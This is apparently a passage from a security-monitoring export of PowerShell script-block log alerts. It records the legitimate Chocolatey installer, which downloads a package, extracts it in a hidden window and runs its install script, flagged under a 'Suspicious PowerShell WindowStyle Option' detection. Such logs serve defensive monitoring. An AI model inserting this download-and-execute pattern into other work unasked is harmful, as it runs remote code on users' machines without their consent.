$chocInstallPS1 = Join-Path $toolsFolder ""chocolateyInstall.ps1"" & $chocInstallPS1 Write-Output 'Ensuring chocolatey commands are on the path' $chocInstallVariableName = ""ChocolateyInstall"" $chocoPath = [Environment]::GetEnvironmentVariable($chocInstallVariableName) if ($chocoPath -eq $null -or $chocoPath -eq '') { $chocoPath = ""$env:ALLUSERSPROFILE\Chocolatey"" } if (!(Test-Path ($chocoPath))) { $chocoPath = ""$env:SYSTEMDRIVE\ProgramData\Chocolatey"" } $chocoExePath = Join-Path $chocoPath 'bin' if ($($env:Path).ToLower().Contains($($chocoExePath).ToLower()) -eq $false) { $env:Path = [Environment]::GetEnvironmentVariable('Path',[System.EnvironmentVariableTarget]::Machine); } Write-Output 'Ensuring","MessageNumber: 1 ¦ MessageTotal: 2 ¦ Path: ¦ ScriptBlockId: e992c6bd-f3bf-42a3-80ea-9e74d03e44fe ¦ ScriptBlockText: # ===================================================================== # Copyright 2017 - Present Chocolatey Software, Inc, and the # original authors/contributors from ChocolateyGallery # Copyright 2011 - 2017 RealDimensions Software, LLC, and the # original authors/contributors from ChocolateyGallery # at https://github.com/chocolatey/chocolatey.org # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. # ===================================================================== # For organizational deployments of Chocolatey, please see https://chocolatey.org/docs/how-to-setup-offline-installation # Environment Variables, specified as $env:NAME in PowerShell.exe and %NAME% in cmd.exe. # For explicit proxy, please set $env:chocolateyProxyLocation and optionally $env:chocolateyProxyUser and $env:chocolateyProxyPassword # For an explicit version of Chocolatey, please set $env:chocolateyVersion = 'versionnumber' # To target a different url for chocolatey.nupkg, please set $env:chocolateyDownloadUrl = 'full url to nupkg file' # NOTE: $env:chocolateyDownloadUrl does not work with $env:chocolateyVersion. # To use built-in compression instead of 7zip (requires additional download), please set $env:chocolateyUseWindowsCompression = 'true' # To bypass the use of any proxy, please set $env:chocolateyIgnoreProxy = 'true' #specifically use the API to get the latest version (below) $url = '' $chocolateyVersion = $env:chocolateyVersion if (![string]::IsNullOrEmpty($chocolateyVersion)){ Write-Output ""Downloading specific version of Chocolatey: $chocolateyVersion"" $url = ""https://chocolatey.org/api/v2/package/chocolatey/$chocolateyVersion"" } $chocolateyDownloadUrl = $env:chocolateyDownloadUrl if (![string]::IsNullOrEmpty($chocolateyDownloadUrl)){ Write-Output ""Downloading Chocolatey from : $chocolateyDownloadUrl"" $url = ""$chocolateyDownloadUrl"" } if ($env:TEMP -eq $null) { $env:TEMP = Join-Path $env:SystemDrive 'temp' } $chocTempDir = Join-Path $env:TEMP ""chocolatey"" $tempDir = Join-Path $chocTempDir ""chocInstall"" if (![System.IO.Directory]::Exists($tempDir)) {[void][System.IO.Directory]::CreateDirectory($tempDir)} $file = Join-Path $tempDir ""chocolatey.zip"" # PowerShell v2/3 caches the output stream. Then it throws errors due # to the FileStream not being what is expected. Fixes ""The OS handle's # position is not what FileStream expected. Do not use a handle # simultaneously in one FileStream and in Win32 code or another # FileStream."" function Fix-PowerShellOutputRedirectionBug { $poshMajorVerion = $PSVersionTable.PSVersion.Major if ($poshMajorVerion -lt 4) { try{ # http://www.leeholmes.com/blog/2008/07/30/workaround-the-os-handles-position-is-not-what-filestream-expected/ plus comments $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $objectRef = $host.GetType().GetField(""externalHostRef"", $bindingFlags).GetValue($host) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetProperty"" $consoleHost = $objectRef.GetType().GetProperty(""Value"", $bindingFlags).GetValue($objectRef, @()) [void] $consoleHost.GetType().GetProperty(""IsStandardOutputRedirected"", $bindingFlags).GetValue($consoleHost, @()) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $field = $consoleHost.GetType().GetField(""standardOutputWriter"", $bindingFlags) $field.SetValue($consoleHost, [Console]::Out) [void] $consoleHost.GetType().GetProperty(""IsStandardErrorRedirected"", $bindingFlags).GetValue($consoleHost, @()) $field2 = $consoleHost.GetType().GetField(""standardErrorWriter"", $bindingFlags) $field2.SetValue($consoleHost, [Console]::Error) } catch { Write-Output ""Unable to apply redirection fix."" } } } Fix-PowerShellOutputRedirectionBug # Attempt to set highest encryption available for SecurityProtocol. # PowerShell will not set this by default (until maybe .NET 4.6.x). This # will typically produce a message for PowerShell v2 (just an info # message though) try { # Set TLS 1.2 (3072), then TLS 1.1 (768), then TLS 1.0 (192), finally SSL 3.0 (48) # Use integers because the enumeration values for TLS 1.2 and TLS 1.1 won't # exist in .NET 4.0, even though they are addressable if .NET 4.5+ is # installed (.NET 4.5 is an in-place upgrade). [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192 -bor 48 } catch { Write-Output 'Unable to set PowerShell to use TLS 1.2 and TLS 1.1 due to old .NET Framework installed. If you see underlying connection closed or trust errors, you may need to do one or more of the following: (1) upgrade to .NET Framework 4.5+ and PowerShell v3, (2) specify internal Chocolatey package location (set $env:chocolateyDownloadUrl prior to install or host the package internally), (3) use the Download + PowerShell method of install. See https://chocolatey.org/install for all install options.' } function Get-Downloader { param ( [string]$url ) $downloader = new-object System.Net.WebClient $defaultCreds = [System.Net.CredentialCache]::DefaultCredentials if ($defaultCreds -ne $null) { $downloader.Credentials = $defaultCreds } $ignoreProxy = $env:chocolateyIgnoreProxy if ($ignoreProxy -ne $null -and $ignoreProxy -eq 'true') { Write-Debug ""Explicitly bypassing proxy due to user environment variable"" $downloader.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy() } else { # check if a proxy is required $explicitProxy = $env:chocolateyProxyLocation $explicitProxyUser = $env:chocolateyProxyUser $explicitProxyPassword = $env:chocolateyProxyPassword if ($explicitProxy -ne $null -and $explicitProxy -ne '') { # explicit proxy $proxy = New-Object System.Net.WebProxy($explicitProxy, $true) if ($explicitProxyPassword -ne $null -and $explicitProxyPassword -ne '') { $passwd = ConvertTo-SecureString $explicitProxyPassword -AsPlainText -Force $proxy.Credentials = New-Object System.Management.Automation.PSCredential ($explicitProxyUser, $passwd) } Write-Debug ""Using explicit proxy server '$explicitProxy'."" $downloader.Proxy = $proxy } elseif (!$downloader.Proxy.IsBypassed($url)) { # system proxy (pass through) $creds = $defaultCreds if ($creds -eq $null) { Write-Debug ""Default credentials were null. Attempting backup method"" $cred = get-credential $creds = $cred.GetNetworkCredential(); } $proxyaddress = $downloader.Proxy.GetProxy($url).Authority Write-Debug ""Using system proxy server '$proxyaddress'."" $proxy = New-Object System.Net.WebProxy($proxyaddress) $proxy.Credentials = $creds $downloader.Proxy = $proxy } } return $downloader } function Download-String { param ( [string]$url ) $downloader = Get-Downloader $url return $downloader.DownloadString($url) } function Download-File { param ( [string]$url, [string]$file ) #Write-Output ""Downloading $url to $file"" $downloader = Get-Downloader $url $downloader.DownloadFile($url, $file) } if ($url -eq $null -or $url -eq '') { Write-Output ""Getting latest version of the Chocolatey package for download."" $url = 'https://chocolatey.org/api/v2/Packages()?$filter=((Id%20eq%20%27chocolatey%27)%20and%20(not%20IsPrerelease))%20and%20IsLatestVersion' [xml]$result = Download-String $url $url = $result.feed.entry.content.src } # Download the Chocolatey package Write-Output ""Getting Chocolatey from $url."" Download-File $url $file # Determine unzipping method # 7zip is the most compatible so use it by default $7zaExe = Join-Path $tempDir '7za.exe' $unzipMethod = '7zip' $useWindowsCompression = $env:chocolateyUseWindowsCompression if ($useWindowsCompression -ne $null -and $useWindowsCompression -eq 'true') { Write-Output 'Using built-in compression to unzip' $unzipMethod = 'builtin' } elseif (-Not (Test-Path ($7zaExe))) { Write-Output ""Downloading 7-Zip commandline tool prior to extraction."" # download 7zip Download-File 'https://chocolatey.org/7za.exe' ""$7zaExe"" } # unzip the package Write-Output ""Extracting $file to $tempDir..."" if ($unzipMethod -eq '7zip') { $params = ""x -o`""$tempDir`"" -bd -y `""$file`"""" # use more robust Process as compared to Start-Process -Wait (which doesn't # wait for the process to finish in PowerShell v3) $process = New-Object System.Diagnostics.Process $process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo($7zaExe, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.Start() | Out-Null $process.BeginOutputReadLine() $process.WaitForExit() $exitCode = $process.ExitCode $process.Dispose() $errorMessage = ""Unable to unzip package using 7zip. Perhaps try setting `$env:chocolateyUseWindowsCompression = 'true' and call install again. Error:"" switch ($exitCode) { 0 { break } 1 { throw ""$errorMessage Some files could not be extracted"" } 2 { throw ""$errorMessage 7-Zip encountered a fatal error while extracting the files"" } 7 { throw ""$errorMessage 7-Zip command line error"" } 8 { throw ""$errorMessage 7-Zip out of memory"" } 255 { throw ""$errorMessage Extraction cancelled by the user"" } default { throw ""$errorMessage 7-Zip signalled an unknown error (code $exitCode)"" } } } else { if ($PSVersionTable.PSVersion.Major -lt 5) { try { $shellApplication = new-object -com shell.application $zipPackage = $shellApplication.NameSpace($file) $destinationFolder = $shellApplication.NameSpace($tempDir) $destinationFolder.CopyHere($zipPackage.Items(),0x10) } catch { throw ""Unable to unzip package using built-in compression. Set `$env:chocolateyUseWindowsCompression = 'false' and call install again to use 7zip to unzip. Error: `n $_"" } } else { Expand-Archive -Path ""$file"" -DestinationPath ""$tempDir"" -Force } } # Call chocolatey install Write-Output ""Installing chocolatey on this machine"" $toolsFolder = Join-Path $tempDir ""tools"" $chocInstallPS1 = Join-Path $toolsFolder ""chocolateyInstall.ps1"" & $chocInstallPS1 Write-Output 'Ensuring chocolatey commands are on the path' $chocInstallVariableName = ""ChocolateyInstall"" $chocoPath = [Environment]::GetEnvironmentVariable($chocInstallVariableName) if ($chocoPath -eq $null -or $chocoPath -eq '') { $chocoPath = ""$env:ALLUSERSPROFILE\Chocolatey"" } if (!(Test-Path ($chocoPath))) { $chocoPath = ""$env:SYSTEMDRIVE\ProgramData\Chocolatey"" } $chocoExePath = Join-Path $chocoPath 'bin' if ($($env:Path).ToLower().Contains($($chocoExePath).ToLower()) -eq $false) { $env:Path = [Environment]::GetEnvironmentVariable('Path',[System.EnvironmentVariableTarget]::Machine); } Write-Output 'Ensuring","d2c72fb1-8ebf-d5d3-1e88-80f15ba1079a"
"2019-03-19 14:21:31.725 +01:00","Suspicious PowerShell WindowStyle Option","med","MSEDGEWIN10","PwSh",4104,58,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-ChocolateyUnzip { <# .SYNOPSIS Unzips an archive file and returns the location for further processing. .DESCRIPTION This unzips files using the 7-zip command line tool 7z.exe. Supported archive formats are listed at: https://sevenzip.osdn.jp/chm/general/formats.htm Prior to 0.9.10.1, 7za.exe was used. Supported archive formats for 7za.exe are: 7z, lzma, cab, zip, gzip, bzip2, and tar. .INPUTS None .OUTPUTS Returns the passed in $destination. .NOTES If extraction fails, an exception is thrown. If you are embedding files into a package, ensure that you have the rights to redistribute those files if you are sharing this package publicly (like on the community feed). Otherwise, please use Install-ChocolateyZipPackage to download those resources from their official distribution points. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code based on 7-zip's exit code. .PARAMETER FileFullPath This is the full path to the zip file. If embedding it in the package next to the install script, the path will be like `""$(Split-Path -Parent $MyInvocation.MyCommand.Definition)\\file.zip""` In 0.10.1+, `File` is an alias for FileFullPath. This can be a 32-bit or 64-bit file. This is mandatory in earlier versions of Chocolatey, but optional if FileFullPath64 has been provided. .PARAMETER FileFullPath64 Full file path to a 64-bit native installer to run. Available in 0.10.4+. If embedding in the package, you can get it to the path with `""$(Split-Path -parent $MyInvocation.MyCommand.Definition)\\INSTALLER_FILE""` Provide this when you want to provide both 32-bit and 64-bit installers or explicitly only a 64-bit installer (which will cause a package install failure on 32-bit systems). .PARAMETER Destination This is a directory where you would like the unzipped files to end up. If it does not exist, it will be created. .PARAMETER SpecificFolder OPTIONAL - This is a specific directory within zip file to extract. .PARAMETER PackageName OPTIONAL - This will faciliate logging unzip activity for subsequent uninstalls .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Path to the folder where the script is executing $toolsDir = (Split-Path -parent $MyInvocation.MyCommand.Definition) Get-ChocolateyUnzip -FileFullPath ""c:\someFile.zip"" -Destination $toolsDir .LINK Install-ChocolateyZipPackage #> param( [alias(""file"")][parameter(Mandatory=$false, Position=0)][string] $fileFullPath, [parameter(Mandatory=$true, Position=1)][string] $destination, [parameter(Mandatory=$false, Position=2)][string] $specificFolder, [parameter(Mandatory=$false, Position=3)][string] $packageName, [alias(""file64"")][parameter(Mandatory=$false)][string] $fileFullPath64, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bitnessMessage = '' $zipfileFullPath=$fileFullPath if ((Get-ProcessorBits 32) -or $env:ChocolateyForceX86 -eq 'true') { if (!$fileFullPath) { throw ""32-bit archive is not supported for $packageName""; } if ($fileFullPath64) { $bitnessMessage = '32-bit '; } } elseif ($fileFullPath64) { $zipfileFullPath = $fileFullPath64 $bitnessMessage = '64-bit ' } if ($zipfileFullPath -eq '' -or $zipfileFullPath -eq $null) { throw 'Package parameters incorrect, either FileFullPath or FileFullPath64 must be specified.' } if ($packageName) { $packagelibPath = $env:ChocolateyPackageFolder if (!(Test-Path -path $packagelibPath)) { New-Item $packagelibPath -type directory } $zipFilename=split-path $zipfileFullPath -Leaf $zipExtractLogFullPath= Join-Path $packagelibPath $zipFilename`.txt } if ($env:chocolateyPackageName -ne $null -and $env:chocolateyPackageName -eq $env:ChocolateyInstallDirectoryPackage) { Write-Warning ""Install Directory override not available for zip packages at this time.`n If this package also runs a native installer using Chocolatey`n functions, the directory will be honored."" } Write-Host ""Extracting $bitnessMessage$zipfileFullPath to $destination..."" if (![System.IO.Directory]::Exists($destination)) { [System.IO.Directory]::CreateDirectory($destination) | Out-Null } $7zip = Join-Path ""$helpersPath"" '..\tools\7z.exe' if (!([System.IO.File]::Exists($7zip))) { Update-SessionEnvironment $7zip = Join-Path ""$env:ChocolateyInstall"" 'tools\7z.exe' } $7zip = [System.IO.Path]::GetFullPath($7zip) Write-Debug ""7zip found at `'$7zip`'"" # 32-bit 7z would not find C:\Windows\System32\config\systemprofile\AppData\Local\Temp, # because it gets translated to C:\Windows\SysWOW64\... by the WOW redirection layer. # Replace System32 with sysnative, which does not get redirected. # 32-bit 7z is required so it can see both architectures if ([IntPtr]::Size -ne 4) { $fileFullPathNoRedirection = $zipfileFullPath -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') $destinationNoRedirection = $destination -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') } else { $fileFullPathNoRedirection = $zipfileFullPath $destinationNoRedirection = $destination } $params = ""x -aoa -bd -bb1 -o`""$destinationNoRedirection`"" -y `""$fileFullPathNoRedirection`"""" if ($specificfolder) { $params += "" `""$specificfolder`"""" } Write-Debug ""Executing command ['$7zip' $params]"" # Capture 7z's output into a StringBuilder and write it out in blocks, to improve I/O performance. $global:zipFileList = New-Object System.Text.StringBuilder $global:zipDestinationFolder = $destination # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { $line = $EventArgs.Data Write-Verbose ""$line"" if ($line.StartsWith(""- "")) { $global:zipFileList.AppendLine($global:zipDestinationFolder + ""\"" + $line.Substring(2)) } } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyZipProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyZipProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null $process.StartInfo = new-object System.Diagnostics.ProcessStartInfo($7zip, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = Get-Location $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.StartInfo.CreateNoWindow = $true $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyZipProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyZipProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for 7z.exe process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Set-PowerShellExitCode $exitCode Write-Debug ""Command ['$7zip' $params] exited with `'$exitCode`'."" if ($zipExtractLogFullPath) { Set-Content $zipExtractLogFullPath $global:zipFileList.ToString() -Encoding UTF8 -Force } Write-Debug ""7z exit code: $exitCode"" $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { throw 'Some files could not be extracted.' + $errorMessageAddendum } # this one is returned e.g. for access denied errors 2 { throw '7-Zip encountered a fatal error while extracting the files.' + $errorMessageAddendum } 7 { throw ('7-Zip command line error.' + $errorMessageAddendum) } 8 { throw '7-Zip out of memory.' + $errorMessageAddendum } 255 { throw 'Extraction cancelled by the user.' + $errorMessageAddendum } default { throw ""7-Zip signalled an unknown error (code $exitCode)"" + $errorMessageAddendum} } $env:ChocolateyPackageInstallLocation = $destination return $destination } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCDl7UF34Z4O7bJl # J2k4Fq6w3RZugnxsmdjzMLvixJbal6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # 